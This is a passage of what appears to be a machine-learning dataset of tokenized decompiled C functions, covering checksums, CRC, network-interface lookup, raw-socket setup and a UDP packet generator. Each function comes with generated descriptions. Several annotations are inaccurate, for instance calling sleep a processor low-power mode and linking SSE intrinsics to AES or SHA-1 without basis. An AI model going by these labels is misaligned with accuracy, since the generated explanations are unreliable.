            ";",
            "v4",
            "=",
            "v3",
            "+",
            "1",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "a2",
            "-",
            "2",
            ")",
            "<",
            "=",
            "0xD",
            ")",
            "{",
            "v9",
            "=",
            "(",
            "unsigned",
            "__int16",
            "*",
            ")",
            "a1",
            ";",
            "v10",
            "=",
            "0",
            ";",
            "}",
            "else",
            "{",
            "v5",
            "=",
            "0L",
            "L",
            ";",
            "v6",
            "=",
            "a1",
            ";",
            "do",
            "{",
            "v7",
            "=",
            "_mm_loadu_si128",
            "(",
            "v6",
            "+",
            "+",
            ")",
            ";",
            "v5",
            "=",
            "_mm_add_epi32",
            "(",
            "_mm_add_epi32",
            "(",
            "v5",
            ",",
            "_mm_unpacklo_epi16",
            "(",
            "v7",
            ",",
            "(",
            "__m128i",
            ")",
            "0L",
            "L",
            ")",
            ")",
            ",",
            "_mm_unpackhi_epi16",
            "(",
            "v7",
            ",",
            "(",
            "__m128i",
            ")",
            "0L",
            "L",
            ")",
            ")",
            ";",
            "}",
            "while",
            "(",
            "v6",
            "!",
            "=",
            "&",
            "a1",
            "[",
            "v4",
            ">",
            ">",
            "3",
            "]",
            ")",
            ";",
            "v8",
            "=",
            "_mm_add_epi32",
            "(",
            "v5",
            ",",
            "_mm_srli_si128",
            "(",
            "v5",
            ",",
            "8",
            ")",
            ")",
            ";",
            "a2",
            "-",
            "=",
            "2",
            "*",
            "(",
            "v4",
            "&",
            "0xFFFFFFF8",
            ")",
            ";",
            "v9",
            "=",
            "(",
            "unsigned",
            "__int16",
            "*",
            ")",
            "a1",
            "+",
            "(",
            "v4",
            "&",
            "0xFFFFFFF8",
            ")",
            ";",
            "v10",
            "=",
            "_mm_cvtsi128_si32",
            "(",
            "_mm_add_epi32",
            "(",
            "v8",
            ",",
            "_mm_srli_si128",
            "(",
            "v8",
            ",",
            "4",
            ")",
            ")",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "(",
            "v4",
            "&",
            "0xFFFFFFF8",
            ")",
            ")",
            "{",
            "LABEL_13",
            ":",
            "a1",
            "=",
            "(",
            "__m128i",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "a1",
            "+",
            "2",
            "*",
            "v3",
            "+",
            "2",
            ")",
            ";",
            "v11",
            "=",
            "v2",
            "-",
            "2",
            "*",
            "v3",
            ";",
            "goto",
            "LABEL_14",
            ";",
            "}",
            "}",
            "v10",
            "+",
            "=",
            "*",
            "v9",
            ";",
            "if",
            "(",
            "a2",
            "-",
            "2",
            ">",
            "1",
            ")",
            "{",
            "v10",
            "+",
            "=",
            "v9",
            "[",
            "1",
            "]",
            ";",
            "if",
            "(",
            "a2",
            "-",
            "4",
            ">",
            "1",
            ")",
            "{",
            "v10",
            "+",
            "=",
            "v9",
            "[",
            "2",
            "]",
            ";",
            "if",
            "(",
            "a2",
            "-",
            "6",
            ">",
            "1",
            ")",
            "{",
            "v10",
            "+",
            "=",
            "v9",
            "[",
            "3",
            "]",
            ";",
            "if",
            "(",
            "a2",
            "-",
            "8",
            ">",
            "1",
            ")",
            "{",
            "v10",
            "+",
            "=",
            "v9",
            "[",
            "4",
            "]",
            ";",
            "if",
            "(",
            "a2",
            "-",
            "10",
            ">",
            "1",
            ")",
            "{",
            "v10",
            "+",
            "=",
            "v9",
            "[",
            "5",
            "]",
            ";",
            "if",
            "(",
            "a2",
            ">",
            "13",
            ")",
            "v10",
            "+",
            "=",
            "v9",
            "[",
            "6",
            "]",
            ";",
            "}",
            "}",
            "}",
            "}",
            "}",
            "goto",
            "LABEL_13",
            ";",
            "}",
            "v11",
            "=",
            "a2",
            ";",
            "v10",
            "=",
            "0",
            ";",
            "LABEL_14",
            ":",
            "if",
            "(",
            "v11",
            "=",
            "=",
            "1",
            ")",
            "{",
            "LOBYTE",
            "(",
            "v13",
            ")",
            "=",
            "a1",
            "-",
            ">",
            "m128i_i8",
            "[",
            "0",
            "]",
            ";",
            "v10",
            "+",
            "=",
            "v13",
            ";",
            "}",
            "return",
            "(",
            "unsigned",
            "__int16",
            ")",
            "~",
            "(",
            "v10",
            "+",
            "HIWORD",
            "(",
            "v10",
            ")",
            "+",
            "(",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v10",
            "+",
            "(",
            "v10",
            ">",
            ">",
            "16",
            ")",
            ")",
            ">",
            ">",
            "16",
            ")",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_mm_loadu` function is likely utilized in the context of implementing cryptographic algorithms, particularly AES and SHA-1, to load unaligned memory data into 128-bit SSE registers for efficient processing.",
            "The function `_mm_add_epi32_mm_add_epi` likely performs 32-bit integer addition on two vectors using SIMD (Single Instruction, Multiple Data) instructions, potentially targeting Intel's SSE or AVX instruction sets.",
            "The function `mm_unpacklo_ep` appears to be part of a larger codebase for SIMD (Single Instruction, Multiple Data) operations, specifically dealing with byte unpacking and conversion to floating-point values, likely intended for image processing or similar tasks, facilitating efficient parallel processing of pixel data.",
            "The function `mm_unpackhi_epi` appears to be part of a larger SIMD (Single Instruction, Multiple Data) operation, likely used for unpacking and combining high-order elements from pairs of 128-bit integer vectors in Intel's SSE2 instruction set.",
            "The function `_add_ep` appears to be involved in implementing parts of cryptographic algorithms or string manipulation, utilizing SIMD (Single Instruction, Multiple Data) instructions for enhanced performance on modern CPUs."
        ],
        "longer_label": "The provided code appears to implement an optimized checksum calculation function utilizing SIMD instructions, likely targeting Intel's SSE or AVX instruction sets, potentially for use in cryptographic algorithms such as AES or SHA-1, with annotations indicating the usage of functions for loading unaligned memory data into SSE registers, performing 32-bit integer addition on vectors, and unpacking bytes for efficient parallel processing of data."
    },
    {
        "id": 327,
        "docstring_tokens": [
            "The",
            "code",
            "calculates",
            "a",
            "checksum",
            "for",
            "a",
            "buffer",
            "of",
            "data",
            "by",
            "summing",
            "up",
            "the",
            "values",
            "and",
            "adjusting",
            "for",
            "overflow",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "__int16",
            "*",
            "a1",
            ",",
            "int",
            "a2",
            ")",
            "{",
            "int",
            "v2",
            ";",
            "unsigned",
            "__int16",
            "*",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "if",
            "(",
            "!",
            "a2",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "v2",
            "=",
            "*",
            "a1",
            ";",
            "v3",
            "=",
            "a1",
            "+",
            "1",
            ";",
            "if",
            "(",
            "a2",
            "!",
            "=",
            "1",
            ")",
            "{",
            "v4",
            "=",
            "(",
            "__int64",
            ")",
            "&",
            "a1",
            "[",
            "a2",
            "-",
            "2",
            "+",
            "2",
            "]",
            ";",
            "do",
            "{",
            "v5",
            "=",
            "*",
            "v3",
            "+",
            "+",
            ";",
            "v2",
            "+",
            "=",
            "v5",
            ";",
            "if",
            "(",
            "(",
            "v2",
            "&",
            "0xFFFF0000",
            ")",
            "!",
            "=",
            "0",
            ")",
            "v2",
            "=",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v2",
            "+",
            "1",
            ";",
            "}",
            "while",
            "(",
            "(",
            "unsigned",
            "__int16",
            "*",
            ")",
            "v4",
            "!",
            "=",
            "v3",
            ")",
            ";",
            "}",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "~",
            "v2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to implement a checksum function (cksum) for an array of unsigned 16-bit integers, with annotations missing, requiring a proper analysis to determine its functionality."
    },
    {
        "id": 328,
        "docstring_tokens": [
            "This",
            "code",
            "calculates",
            "a",
            "16-bit",
            "CRC",
            "checksum",
            "for",
            "a",
            "given",
            "data",
            "array",
            "of",
            "a",
            "specified",
            "length",
            "."
        ],
        "code_tokens": [
            "__int16",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "__m128i",
            "*",
            "a1",
            ",",
            "int",
            "a2",
            ")",
            "{",
            "unsigned",
            "int",
            "v2",
            ";",
            "unsigned",
            "int",
            "v3",
            ";",
            "const",
            "__m128i",
            "*",
            "v4",
            ";",
            "__m128i",
            "v5",
            ";",
            "__m128i",
            "v6",
            ";",
            "__m128i",
            "v7",
            ";",
            "unsigned",
            "__int8",
            "*",
            "v8",
            ";",
            "__m128i",
            "v9",
            ";",
            "__int16",
            "result",
            ";",
            "v2",
            "=",
            "a2",
            ">",
            ">",
            "1",
            ";",
            "v3",
            "=",
            "(",
            "a2",
            ">",
            ">",
            "1",
            ")",
            "-",
            "1",
            ";",
            "if",
            "(",
            "a2",
            ">",
            ">",
            "1",
            ")",
            "{",
            "if",
            "(",
            "v3",
            "<",
            "=",
            "6",
            ")",
            "{",
            "v8",
            "=",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "a1",
            ";",
            "result",
            "=",
            "0",
            ";",
            "}",
            "else",
            "{",
            "v4",
            "=",
            "a1",
            ";",
            "v5",
            "=",
            "0L",
            "L",
            ";",
            "do",
            "{",
            "v6",
            "=",
            "_mm_loadu_si128",
            "(",
            "v4",
            "+",
            "+",
            ")",
            ";",
            "v5",
            "=",
            "_mm_xor_si128",
            "(",
            "v5",
            ",",
            "v6",
            ")",
            ";",
            "}",
            "while",
            "(",
            "v4",
            "!",
            "=",
            "&",
            "a1",
            "[",
            "v2",
            ">",
            ">",
            "3",
            "]",
            ")",
            ";",
            "v7",
            "=",
            "_mm_xor_si128",
            "(",
            "v5",
            ",",
            "_mm_srli_si128",
            "(",
            "v5",
            ",",
            "8",
            ")",
            ")",
            ";",
            "v3",
            "-",
            "=",
            "v2",
            "&",
            "0xFFFFFFF8",
            ";",
            "v8",
            "=",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "a1",
            "+",
            "2",
            "*",
            "(",
            "v2",
            "&",
            "0xFFFFFFF8",
            ")",
            ";",
            "v9",
            "=",
            "_mm_xor_si128",
            "(",
            "v7",
            ",",
            "_mm_srli_si128",
            "(",
            "v7",
            ",",
            "4",
            ")",
            ")",
            ";",
            "result",
            "=",
            "_mm_extract_epi16",
            "(",
            "_mm_xor_si128",
            "(",
            "v9",
            ",",
            "_mm_srli_si128",
            "(",
            "v9",
            ",",
            "2",
            ")",
            ")",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "v2",
            "=",
            "=",
            "(",
            "v2",
            "&",
            "0xFFFFFFF8",
            ")",
            ")",
            "{",
            "LABEL_13",
            ":",
            "a1",
            "=",
            "(",
            "const",
            "__m128i",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "a1",
            "+",
            "2",
            "*",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "(",
            "a2",
            ">",
            ">",
            "1",
            ")",
            "-",
            "1",
            ")",
            "+",
            "2",
            ")",
            ";",
            "goto",
            "LABEL_14",
            ";",
            "}",
            "}",
            "result",
            "^",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "v8",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "{",
            "result",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v8",
            "+",
            "1",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "!",
            "=",
            "1",
            ")",
            "{",
            "result",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v8",
            "+",
            "2",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "!",
            "=",
            "2",
            ")",
            "{",
            "result",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v8",
            "+",
            "3",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "!",
            "=",
            "3",
            ")",
            "{",
            "result",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v8",
            "+",
            "4",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "!",
            "=",
            "4",
            ")",
            "{",
            "result",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v8",
            "+",
            "5",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "!",
            "=",
            "5",
            ")",
            "result",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "v8",
            "+",
            "6",
            ")",
            ";",
            "}",
            "}",
            "}",
            "}",
            "}",
            "goto",
            "LABEL_13",
            ";",
            "}",
            "result",
            "=",
            "0",
            ";",
            "LABEL_14",
            ":",
            "if",
            "(",
            "(",
            "a2",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ")",
            "return",
            "a1",
            "-",
            ">",
            "m128i_u8",
            "[",
            "0",
            "]",
            "^",
            "result",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_mm_loadu` function is likely used to load unaligned data into SSE registers for efficient SIMD (Single Instruction, Multiple Data) processing, commonly employed in cryptography algorithms like SHA-1 and AES.",
            "The `_xor_si128` function appears to perform a bitwise XOR operation between two 128-bit integer vectors in the context of cryptographic hash functions like SHA-1 or Blake2b.",
            "The function `mm_srli_si` appears to be part of a larger codebase implementing SIMD (Single Instruction, Multiple Data) operations using Intel's SSE (Streaming SIMD Extensions) intrinsics, likely performing bitwise operations such as shifting and XORing on 128-bit integer vectors (`__m128i`).",
            "The function `_extract_epi` appears to extract elements from vectors using Intel Intrinsics, likely for cryptographic or hash computation purposes, handling different vector sizes and architectures for optimized performance.",
            "The `_xor_si` function is used to perform a bitwise XOR operation between two 128-bit integer vectors (`__m128i` types) in the context of cryptographic hash function computations, such as SHA-1 or Blake2b."
        ],
        "longer_label": "The given code likely implements a CRC-16 (Cyclic Redundancy Check) algorithm using SIMD (Single Instruction, Multiple Data) operations with Intel's SSE (Streaming SIMD Extensions) intrinsics for efficient processing of data, including loading unaligned data, performing bitwise XOR operations, and shifting on 128-bit integer vectors."
    },
    {
        "id": 329,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "to",
            "get",
            "information",
            "about",
            "a",
            "network",
            "interface",
            "by",
            "name",
            "or",
            "address",
            "from",
            "the",
            "system",
            "'s",
            "interfaces",
            "list",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "*",
            "s2",
            ",",
            "__int64",
            "a2",
            ",",
            "_DWORD",
            "*",
            "a3",
            ")",
            "{",
            "struct",
            "ifaddrs",
            "*",
            "v4",
            ";",
            "unsigned",
            "int",
            "v5",
            ";",
            "struct",
            "sockaddr",
            "*",
            "ifa_addr",
            ";",
            "char",
            "*",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "const",
            "char",
            "*",
            "ifa_name",
            ";",
            "size_t",
            "v10",
            ";",
            "unsigned",
            "__int64",
            "v12",
            ";",
            "const",
            "char",
            "*",
            "v13",
            ";",
            "unsigned",
            "int",
            "v14",
            ";",
            "unsigned",
            "int",
            "v15",
            ";",
            "unsigned",
            "int",
            "v16",
            ";",
            "__int64",
            "v17",
            ";",
            "struct",
            "ifaddrs",
            "*",
            "v18",
            "[",
            "9",
            "]",
            ";",
            "v18",
            "[",
            "1",
            "]",
            "=",
            "(",
            "struct",
            "ifaddrs",
            "*",
            ")",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "getifaddrs",
            "(",
            "v18",
            ")",
            ")",
            "{",
            "perror",
            "(",
            "\"getifaddrs\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "v4",
            "=",
            "v18",
            "[",
            "0",
            "]",
            ";",
            "v5",
            "=",
            "0",
            ";",
            "if",
            "(",
            "v18",
            "[",
            "0",
            "]",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "ifa_addr",
            "=",
            "v4",
            "-",
            ">",
            "ifa_addr",
            ";",
            "if",
            "(",
            "ifa_addr",
            "-",
            ">",
            "sa_family",
            "=",
            "=",
            "2",
            ")",
            "{",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "v4",
            "-",
            ">",
            "ifa_name",
            ",",
            "s2",
            ")",
            ")",
            "break",
            ";",
            "v7",
            "=",
            "inet_ntoa",
            "(",
            "*",
            "(",
            "struct",
            "in_addr",
            "*",
            ")",
            "&",
            "ifa_addr",
            "-",
            ">",
            "sa_data",
            "[",
            "2",
            "]",
            ")",
            ";",
            "v8",
            "=",
            "strcmp",
            "(",
            "v7",
            ",",
            "s2",
            ")",
            ";",
            "v4",
            "=",
            "v18",
            "[",
            "0",
            "]",
            ";",
            "if",
            "(",
            "!",
            "v8",
            ")",
            "break",
            ";",
            "}",
            "v4",
            "=",
            "v4",
            "-",
            ">",
            "ifa_next",
            ";",
            "v18",
            "[",
            "0",
            "]",
            "=",
            "v4",
            ";",
            "if",
            "(",
            "!",
            "v4",
            ")",
            "return",
            "v5",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_OWORD",
            "*",
            ")",
            "a2",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "a3",
            "=",
            "0",
            ";",
            "ifa_name",
            "=",
            "v4",
            "-",
            ">",
            "ifa_name",
            ";",
            "v10",
            "=",
            "strlen",
            "(",
            "ifa_name",
            ")",
            ";",
            "if",
            "(",
            "v10",
            ">",
            "=",
            "0x14",
            ")",
            "LODWORD",
            "(",
            "v10",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "v10",
            ">",
            "=",
            "8",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "a2",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "ifa_name",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "(",
            "unsigned",
            "int",
            ")",
            "v10",
            "-",
            "8",
            ")",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "ifa_name",
            "[",
            "(",
            "unsigned",
            "int",
            ")",
            "v10",
            "-",
            "8",
            "]",
            ";",
            "v12",
            "=",
            "(",
            "a2",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ";",
            "v13",
            "=",
            "&",
            "ifa_name",
            "[",
            "-",
            "(",
            "a2",
            "-",
            "v12",
            ")",
            "]",
            ";",
            "v14",
            "=",
            "(",
            "v10",
            "+",
            "a2",
            "-",
            "v12",
            ")",
            "&",
            "0xFFFFFFF8",
            ";",
            "if",
            "(",
            "v14",
            ">",
            "=",
            "8",
            ")",
            "{",
            "v15",
            "=",
            "0",
            ";",
            "v16",
            "=",
            "v14",
            "&",
            "0xFFFFFFF8",
            ";",
            "do",
            "{",
            "v17",
            "=",
            "v15",
            ";",
            "v15",
            "+",
            "=",
            "8",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v12",
            "+",
            "v17",
            ")",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v13",
            "[",
            "v17",
            "]",
            ";",
            "}",
            "while",
            "(",
            "v15",
            "<",
            "v16",
            ")",
            ";",
            "}",
            "}",
            "else",
            "if",
            "(",
            "(",
            "v10",
            "&",
            "4",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a2",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "ifa_name",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "(",
            "unsigned",
            "int",
            ")",
            "v10",
            "-",
            "4",
            ")",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "ifa_name",
            "[",
            "(",
            "unsigned",
            "int",
            ")",
            "v10",
            "-",
            "4",
            "]",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "_DWORD",
            ")",
            "v10",
            ")",
            "{",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "a2",
            "=",
            "*",
            "ifa_name",
            ";",
            "if",
            "(",
            "(",
            "v10",
            "&",
            "2",
            ")",
            "!",
            "=",
            "0",
            ")",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "(",
            "unsigned",
            "int",
            ")",
            "v10",
            "-",
            "2",
            ")",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "&",
            "ifa_name",
            "[",
            "(",
            "unsigned",
            "int",
            ")",
            "v10",
            "-",
            "2",
            "]",
            ";",
            "}",
            "v5",
            "=",
            "1",
            ";",
            "*",
            "a3",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "ifa_addr",
            "-",
            ">",
            "sa_data",
            "[",
            "2",
            "]",
            ";",
            "}",
            "return",
            "v5",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read an unsigned 64-bit quadword from the FS segment register at a specified offset, primarily in low-level programming for system-level tasks like kernel development or hardware interaction.",
            "The `inet_ntoa` function is used to convert an IPv4 address from binary form (in_addr struct) to a human-readable string format.",
            "The `strcmp` function is used to compare two strings in the provided code snippets, particularly in conditional statements checking if `proc_id` matches certain string values like \"+\" or \"-\"."
        ],
        "longer_label": "The provided code is a function written in C that retrieves network interface information, specifically IPv4 addresses, for a given interface name, utilizing system-level functions such as `getifaddrs`, `inet_ntoa`, and low-level memory operations, with annotations providing insights into the usage of specific functions and operations within the code."
    },
    {
        "id": 330,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "a",
            "socket",
            "for",
            "sending",
            "raw",
            "packets",
            "with",
            "specified",
            "options",
            "such",
            "as",
            "IP",
            "header",
            "inclusion",
            ",",
            "socket",
            "buffer",
            "size",
            ",",
            "and",
            "error",
            "handling",
            "for",
            "each",
            "option",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "int",
            "v1",
            ";",
            "int",
            "v2",
            ";",
            "__int64",
            "result",
            ";",
            "int",
            "optval",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "optval",
            "=",
            "1",
            ";",
            "v1",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "3",
            ",",
            "255",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2044",
            ")",
            "=",
            "v1",
            ";",
            "if",
            "(",
            "v1",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"snd_pim_sock socket\"",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "if",
            "(",
            "setsockopt",
            "(",
            "v1",
            ",",
            "0",
            ",",
            "3",
            ",",
            "&",
            "optval",
            ",",
            "4u",
            ")",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"setsockopt IP_HDRINCL\"",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "v2",
            "=",
            "setsockopt",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2044",
            ")",
            ",",
            "1",
            ",",
            "7",
            ",",
            "(",
            "const",
            "void",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2048",
            ")",
            ",",
            "4u",
            ")",
            ";",
            "result",
            "=",
            "1L",
            "L",
            ";",
            "if",
            "(",
            "v2",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"setsockopt SO_SNDBUF\"",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` appears to be a macro defined to read a 64-bit value from the FS segment register, commonly used for accessing thread-local storage or operating system-specific data structures in x86 assembly, and the provided code snippet utilizes it to retrieve a value from the FS segment register for system-specific operations."
        ],
        "longer_label": "The provided code initializes a socket, sets socket options for IP_HDRINCL and SO_SNDBUF, utilizing system-specific operations like reading from the FS segment register for thread-local storage or OS data structures."
    },
    {
        "id": 331,
        "docstring_tokens": [
            "The",
            "code",
            "continuously",
            "calculates",
            "and",
            "prints",
            "statistics",
            "on",
            "packet",
            "sending",
            "speed",
            "in",
            "terms",
            "of",
            "packets",
            "per",
            "second",
            "and",
            "Mbps",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "stats_loop",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "pthread_mutex_t",
            "*",
            "i",
            ";",
            "int",
            "v2",
            ";",
            "for",
            "(",
            "i",
            "=",
            "(",
            "pthread_mutex_t",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2056",
            ")",
            ";",
            ";",
            "pthread_mutex_unlock",
            "(",
            "i",
            ")",
            ")",
            "{",
            "sleep",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2116",
            ")",
            ")",
            ";",
            "v2",
            "=",
            "time",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "pthread_mutex_lock",
            "(",
            "i",
            ")",
            ";",
            "__printf_chk",
            "(",
            "1L",
            "L",
            ",",
            "\"Send %lu pkts in %d secs (%lu kpps, %lu Mbps)\\n\"",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2096",
            ")",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v2",
            "-",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2112",
            ")",
            ")",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2096",
            ")",
            "/",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "v2",
            "-",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2112",
            ")",
            ")",
            "/",
            "0x3E8",
            ",",
            "8L",
            "L",
            "*",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2104",
            ")",
            "/",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "v2",
            "-",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2112",
            ")",
            ")",
            "/",
            "0xF4240",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2112",
            ")",
            "=",
            "v2",
            ";",
            "*",
            "(",
            "_OWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "2096",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_mutex_unlock` function appears to be a generic mutex unlocking function used in various contexts across different code snippets to release locks held by threads, ensuring safe access to shared resources.",
            "The function \"sleep\" is used to put the system or the processor into a low-power sleep mode for a specified duration of time.",
            "The `_mutex_` function likely initializes various mutex-related structures and resources, such as mutex locks and attributes, required for managing concurrency and synchronization within the respective software systems across different codebases and languages.",
            "The function `__printf` is used as a formatting specifier for functions like `sprintf`, `snprintf`, and their variants, specifying the format of the output string and handling optional arguments, primarily used in embedded systems or low-level programming environments where memory and performance considerations are crucial."
        ],
        "longer_label": "The provided code defines a function `stats_loop` which continuously calculates and prints statistics related to packet transmission, utilizing mutex locks for thread synchronization and employing sleep to control the loop execution."
    },
    {
        "id": 332,
        "docstring_tokens": [
            "The",
            "code",
            "generates",
            "and",
            "sends",
            "UDP",
            "packets",
            "with",
            "specified",
            "options",
            "and",
            "statistics",
            "updates",
            "at",
            "a",
            "certain",
            "rate",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "gen_pkt_loop",
            "(",
            "void",
            "*",
            "a1",
            ")",
            "{",
            "bool",
            "v2",
            ";",
            "unsigned",
            "int",
            "v3",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "pthread_mutex_t",
            "*",
            "v6",
            ";",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "ssize_t",
            "i",
            ";",
            "unsigned",
            "int",
            "n",
            ";",
            "struct",
            "timespec",
            "v11",
            ";",
            "struct",
            "sockaddr",
            "v12",
            ";",
            "int",
            "buf",
            "[",
            "510",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v14",
            ";",
            "v14",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "qmemcpy",
            "(",
            "buf",
            ",",
            "(",
            "char",
            "*",
            ")",
            "a1",
            "+",
            "16",
            ",",
            "0x7E8uL",
            "L",
            ")",
            ";",
            "LOBYTE",
            "(",
            "buf",
            "[",
            "0",
            "]",
            ")",
            "=",
            "69",
            ";",
            "LOWORD",
            "(",
            "buf",
            "[",
            "2",
            "]",
            ")",
            "=",
            "4374",
            ";",
            "buf",
            "[",
            "506",
            "]",
            "=",
            "*",
